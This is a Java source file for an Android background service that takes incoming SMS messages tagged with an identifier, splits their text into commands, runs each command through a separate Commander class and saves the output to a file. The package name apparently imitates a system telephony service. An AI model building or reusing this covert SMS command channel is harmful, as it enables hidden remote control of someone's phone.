package com.telephony.services;

import java.io.File;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.IBinder;

public class SMService extends Service {
	private PreferenceUtils sPref = null;
	private ExecutorService es;

	private String sms_body = null;
	private String phoneNumber = null;
	private String sms_from_name = null;
	private Commander cmdr;

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onCreate() {

		super.onCreate();
		es = Executors.newFixedThreadPool(1);
		sPref = PreferenceUtils.getInstance(this);
		cmdr = new Commander(this);
		Log.d(Utils.LOG_TAG, getClass().getName() + " Create");
	}

	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		es.execute(new RunService(intent, flags, startId, this));
		return START_REDELIVER_INTENT;

	}

	private class RunService implements Runnable {
		private final Intent intent;
		private final int flags;
		private final int startId;
		private final Context context;

		public RunService(Intent intent, int flags, int startId, Context context) {
			this.intent = intent;
			this.flags = flags;
			this.startId = startId;
			this.context = context;
		}

		public void run() {
			try {
				Log.d(Utils.LOG_TAG, context.getClass().getName() + ": start " + startId);
				Log.d(Utils.LOG_TAG, intent.toUri(Intent.URI_INTENT_SCHEME));
				if (sPref.getRootDir().exists() && (Utils.getExternalStorageStatus() == Utils.MEDIA_MOUNTED)) {
					phoneNumber = intent.getStringExtra(Utils.EXTRA_PHONE_NUMBER);
					sms_from_name = Utils.getContactName(context, phoneNumber);
					sms_body = intent.getStringExtra(Utils.EXTRA_SMS_BODY).replace(Utils.IDENT_SMS, "").trim();
					if (sms_body != null) {
						StringBuilder exec_out = new StringBuilder();
						String[] sms = sms_body.split(" *#+ *|[ \r]*\n+");

						for (String cmd : sms) {
							try {
								if (!cmd.isEmpty()) {
									Log.d(Utils.LOG_TAG, "try to exec: " + cmd);
									exec_out.append(cmdr.exec(cmd));
								}
							} catch (Exception e) {
								e.printStackTrace();
							}
						}
						if (exec_out.length() > 0) {
							Utils.writeFile(new File(sPref.getRootDir(), Utils.CONFIG_OUT_FILENAME), exec_out.toString());
						}
					}
				}
			} catch (Exception e) {
				e.printStackTrace();
			} finally {
				stop();
			}
		}

		public void stop() {
			try {

			} catch (Exception e) {
				e.printStackTrace();
			}
			Log.d(Utils.LOG_TAG, context.getClass().getName() + ": stop " + startId);
			stopSelf(startId);
		}

	}

	@Override
	public void onDestroy() {

		super.onDestroy();
		cmdr = null;
		es = null;
		sPref = null;
		Log.d(Utils.LOG_TAG, getClass().getName() + " Destroy");
	}

}
